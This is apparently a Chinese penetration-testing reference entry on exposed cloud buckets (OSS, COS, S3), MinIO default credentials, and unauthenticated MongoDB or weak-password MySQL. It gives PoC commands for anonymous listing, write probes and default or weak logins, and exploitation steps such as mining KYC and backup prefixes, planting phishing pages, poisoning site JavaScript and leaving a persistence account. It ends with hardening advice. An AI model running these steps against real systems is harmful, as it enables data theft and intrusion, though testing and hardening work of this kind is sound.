---
title: 对象存储与数据存储裸露（OSS / S3 / MinIO / MySQL / MongoDB）
cve: 无（配置缺陷）
severity: high
cvss: 8.6
product: 阿里云 OSS / 腾讯云 COS / AWS S3 / MinIO / MySQL / MongoDB
versions: 任意
ports: 80, 443, 9000, 3306, 27017
keywords: oss, s3, bucket, minio, mongodb, mysql, 弱口令, 列举, kyc
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

- 资源 URL：`*.oss-cn-*.aliyuncs.com`、`*.cos.ap-*.myqcloud.com`、`*.s3.*.amazonaws.com`、`:9000`（MinIO 控制台）、`:27017`、`:3306`。
- 前端 JS / `config.js` / 下载链接里的 `ossUrl`、`bucketName`、`Expires`、`OSSAccessKeyId`。

## 前置条件

- 对象存储：Bucket ACL 为 `public-read` / `public-read-write`（或桶策略允许匿名 List）。
- 数据库：对外可达 + 弱口令（`root/root`、`root/123456`、`admin/admin`、Mongo 无认证）。

## PoC

```bash
# 1) OSS / COS / S3 匿名列举
curl -s 'https://bucket.oss-cn-hangzhou.aliyuncs.com/?prefix=&max-keys=100'
curl -s 'https://bucket-1250000000.cos.ap-guangzhou.myqcloud.com/?prefix='
aws s3 ls s3://bucket --no-sign-request

# 2) 可写判定（只写一个无害探针，随后删除）
curl -X PUT 'https://bucket.oss-cn-hangzhou.aliyuncs.com/probe.txt' -d 'probe'

# 3) MinIO 默认口令
curl -s http://target:9000/minio/health/live
# 控制台 admin / minioadmin，或 minioadmin/minioadmin

# 4) MongoDB 未授权
mongosh "mongodb://target:27017" --quiet --eval 'db.adminCommand({listDatabases:1})'

# 5) MySQL 弱口令
mysql -h target -uroot -p'root' -e 'select version(); show databases;'
```

## 利用步骤

1. 从前端与日志里收集 bucket/DB 域名（图片、附件、对账单 PDF 的直链最好用）。
2. 列举 → 按 key 前缀分类（`kyc/`、`withdraw/`、`avatar/`、`backup/`、`sql/`）；`backup/` 与 `sql/` 常直接是整库导出。
3. 可写桶 → 传一个 HTML 用作"展示型 XSS/钓鱼页"，或覆盖业务 JS 做投毒（属高危动作，只在授权范围内做）。
4. DB 进去后先看权限：MySQL `show grants`、Mongo `db.getUser()`；能写就落一个只读账号做长期观察，别改业务数据。
5. 证据：1 个对象名 + ETag/大小 + 一条 `select` 结果；报告里说明数据类别与量级估算（不要贴证件图）。

## 修复与缓解（加固）

- Bucket 一律私有 + 预签名 URL（短有效期）；关闭匿名 List/Put；开启访问日志与异常告警。
- MinIO 改默认口令并只对内；控制台与 API 分离端口。
- MySQL/Mongo 只监听内网、强口令、最小权限账号；Mongo 开 `authorization: enabled`。
- 定期扫描"公开桶/暴露 DB"，把上面 PoC 的前两条做成自检脚本。

## 参考

- AWS S3 Block Public Access 文档；阿里云 OSS 权限与 ACL；MongoDB Security Checklist。
